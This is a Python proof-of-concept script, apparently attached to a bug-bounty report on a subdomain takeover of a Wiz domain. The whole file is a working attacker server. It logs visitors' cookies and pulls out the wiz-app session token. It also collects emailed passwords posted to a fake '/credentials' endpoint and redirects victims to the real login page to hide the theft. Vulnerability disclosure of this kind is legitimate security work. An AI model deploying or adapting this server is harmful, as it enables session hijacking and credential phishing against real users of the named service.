#!/usr/bin/env python3
"""
5-cookie-server.py — Attacker cookie exfiltration server (PoC reference)

PURPOSE: Demonstrates exactly how an attacker would capture the wiz-app
session cookie once win-test.wiz.io is claimed via Vercel.

USAGE (triager reference only — run on your own infra):
    python3 5-cookie-server.py 8080

WHAT IT DOES:
  - Serves the attacker page (6-attacker-page.html) on every GET /
  - Logs the Cookie header from every request
  - Specifically extracts and highlights the wiz-app JWT
  - Saves captures to captured_cookies.log (JSON lines)

THE COOKIE THEFT MECHANISM:
  - Browser sends Cookie: wiz-app=<JWT>; ... on every request to win-test.wiz.io
  - This is automatic — browser behavior, no JavaScript required
  - Domain=.wiz.io scope confirmed from Wiz's own Chrome extension source code
  - wiz-app cookie name confirmed from LT=`wiz-app` in extension background.js
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime, timezone
import json
import sys
import os

LOG_FILE = "captured_cookies.log"
PAGE_FILE = os.path.join(os.path.dirname(__file__), "6-attacker-page.html")


class CookieCaptureHandler(BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        pass  # disable default access log noise

    def do_GET(self):
        self._capture_and_serve()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace") if length else ""
        self._capture_and_serve(post_body=body)

    def _capture_and_serve(self, post_body=None):
        ts = datetime.now(timezone.utc).isoformat()
        raw_cookie = self.headers.get("Cookie", "")
        user_agent  = self.headers.get("User-Agent", "")
        client_ip   = self.client_address[0]
        path        = self.path

        # Parse individual cookies
        cookies = {}
        for part in raw_cookie.split(";"):
            part = part.strip()
            if "=" in part:
                k, v = part.split("=", 1)
                cookies[k.strip()] = v.strip()

        wiz_app = cookies.get("wiz-app")

        entry = {
            "timestamp":   ts,
            "ip":          client_ip,
            "path":        path,
            "ua":          user_agent,
            "wiz_app":     wiz_app,
            "all_cookies": raw_cookie,
            "post_body":   post_body,
        }

        with open(LOG_FILE, "a") as f:
            f.write(json.dumps(entry) + "\n")

        # Terminal output
        if wiz_app:
            print(f"\033[1;32m[{ts}] *** WIZ SESSION CAPTURED ***\033[0m")
            print(f"  IP:        {client_ip}")
            print(f"  Path:      {path}")
            print(f"  wiz-app:   {wiz_app[:60]}{'...' if len(wiz_app) > 60 else ''}")
            print(f"  All cookies: {raw_cookie[:120]}")
            print(f"  → Logged to {LOG_FILE}")
        elif path == "/credentials" and post_body:
            try:
                creds = json.loads(post_body)
                print(f"\033[1;31m[{ts}] *** CREDENTIALS CAPTURED ***\033[0m")
                print(f"  IP:    {client_ip}")
                print(f"  Email: {creds.get('email', 'N/A')}")
                print(f"  PW:    {creds.get('pw', 'N/A')[:20]}...")
            except Exception:
                pass
        elif path == "/ext-telemetry" and post_body:
            try:
                telem = json.loads(post_body)
                print(f"\033[1;33m[{ts}] Wiz extension broadcast received\033[0m")
                print(f"  type: {telem.get('type')}  origin: {telem.get('origin')}")
            except Exception:
                pass
        else:
            print(f"[{ts}] {client_ip} {path} — no wiz-app cookie")

        # Response
        if path == "/credentials":
            # Return 302 to real Wiz login — victim thinks re-auth succeeded
            self.send_response(302)
            self.send_header("Location", "https://app.wiz.io/login/email-challenge")
            self.end_headers()
            return

        self.send_response(200)
        if path in ("/beacon", "/ext-telemetry"):
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"ok")
            return

        # Serve attacker HTML page
        try:
            with open(PAGE_FILE, "rb") as f:
                body = f.read()
        except FileNotFoundError:
            body = b"<h1>Wiz Security Alert</h1>"
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    print(f"\033[1m[*] Attacker cookie capture server — PoC reference only\033[0m")
    print(f"[*] Listening on 0.0.0.0:{port}")
    print(f"[*] Logging wiz-app cookies to {LOG_FILE}")
    print(f"[*] Serving attacker page from {PAGE_FILE}")
    print(f"[*] Ctrl+C to stop\n")
    try:
        HTTPServer(("0.0.0.0", port), CookieCaptureHandler).serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stopped.")
